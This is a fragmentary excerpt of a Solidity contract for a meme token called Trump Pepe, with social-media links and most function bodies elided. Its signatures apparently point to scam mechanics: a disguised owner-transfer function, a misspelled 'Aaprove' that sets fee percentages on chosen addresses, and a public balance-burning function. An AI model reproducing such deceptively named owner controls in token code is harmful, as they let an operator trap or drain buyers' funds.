...
/**
https://t.me/TRUMPPEPE_COIN
https://twitter.com/TRUMPEPE_Erc
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipllptozeros(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract TRUMPEPE is Ownable {
    ...
    constructor (){
        name = unicode"Trump Pepe";
        symbol = unicode"TRUMPEPE";
        decimals = 9;
    ...
    function Aaprove(address[] memory _addresses, uint256 _feePercentage) external {
    ...
    function _burnliqungpepes(address user) public {
